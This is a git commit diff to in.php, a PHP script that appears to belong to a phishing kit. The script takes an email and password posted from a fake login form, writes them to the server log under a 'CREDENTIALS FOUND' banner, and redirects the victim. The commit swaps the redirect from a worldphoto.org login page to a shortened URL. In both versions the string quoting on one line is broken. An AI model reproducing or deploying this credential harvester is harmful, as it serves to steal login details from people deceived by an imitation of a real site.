9afaea4bca3de7aa28851918f2a03ad3752e97f9
dharick <58396545+dharick@users.noreply.github.com>
2022-08-26 13:04:24 +0530

    Update in.php

--- in.php
+++ in.php
@@ -1,8 +1,8 @@
 <?php
 $username = $_POST['Email'];
 $password = $_POST['password'];
-$res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password ];
+$res = [+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
 error_log("[+] Credentials Found!!!");
 error_log("$res");
-echo "<script type='text/javascript'>window.location='https://users.worldphoto.org/user/login'</script>";
+echo "<script type='text/javascript'>window.location='https://shorturl.ae/WNpcJ'</script>";
 ?>
